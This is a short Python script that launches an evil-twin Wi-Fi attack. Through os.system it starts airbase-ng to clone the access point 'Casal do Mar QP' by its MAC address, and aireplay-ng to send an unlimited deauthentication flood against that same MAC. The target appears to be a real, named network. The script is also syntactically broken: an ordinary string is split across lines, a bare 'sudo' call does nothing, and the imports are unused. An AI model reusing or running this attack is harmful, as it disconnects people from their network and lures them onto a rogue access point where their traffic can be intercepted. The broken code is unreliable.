import subprocess
import time
import os
import pandas
from tld import get_tld

MAC = '30:D3:2D:19:18:FC'
essid = 'Casal\ do\ Mar\ QP'
Channel = '11'
interface = 'wlp3s0mon'

def start():

    os.system('sudo ')
    os.system(f'sudo xterm -title TEST -fg green -geometry 100x20-0+0 -e sudo airbase-ng -a {MAC} --essid {essid} -c {Channel} {interface}
              & sudo xterm -title TEST -fg red -geometry 100x20-0+0 -e sudo aireplay-ng --deauth 0 -a {MAC}')

start()
